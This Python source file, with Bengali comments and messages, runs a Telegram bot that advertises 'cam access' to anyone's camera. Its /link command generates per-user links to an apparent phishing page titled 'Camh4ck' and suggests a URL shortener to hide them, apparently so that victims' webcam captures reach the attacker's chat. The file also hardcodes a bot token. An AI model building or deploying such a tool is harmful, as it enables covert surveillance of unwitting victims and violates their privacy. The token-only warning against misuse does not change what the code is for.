import telebot
from telebot import types
import time
from flask import Flask
from threading import Thread
import os

# আপনার বোট টোকেন
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
bot = telebot.TeleBot(BOT_TOKEN)

# ফ্লাস্ক সার্ভার সেটআপ (পোর্টের জন্য)
app = Flask('')

@app.route('/')
def home():
    return "Bot is Alive!"

def run():
    # Render অটোমেটিক পোর্ট দিলে সেটি নিবে, নাহলে ১০০০ পোর্ট ব্যবহার করবে
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# বোটের অন্যান্য লজিক
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        f"হ্যালো {message.from_user.first_name}!\n"
        "Welcome to cam access bot\n\n"
        "এই বোটের সাহায্যে আপনি যে কারো ক্যামেরা এক্সেস করতে পারবেন।\n\n"
        "⚠️ সতর্কবার্তা: কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n"
        "লিঙ্ক তৈরি করতে নিচের /link বাটনে ক্লিক করুন।"
    )
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(commands=['link'])
def send_link(message):
    personal_link = f"{BASE_URL}?id={message.chat.id}"
    response_text = f"✅ আপনার লিঙ্ক: {personal_link}\n\nলিঙ্কটি ছোট করতে পারেন: https://lc.cx/en"
    bot.send_message(message.chat.id, response_text)

if __name__ == "__main__":
    keep_alive() # এটি পোর্ট সমস্যার সমাধান করবে
    while True:
        try:
            print("বোট চলছে...")
            bot.remove_webhook()
            bot.infinity_polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
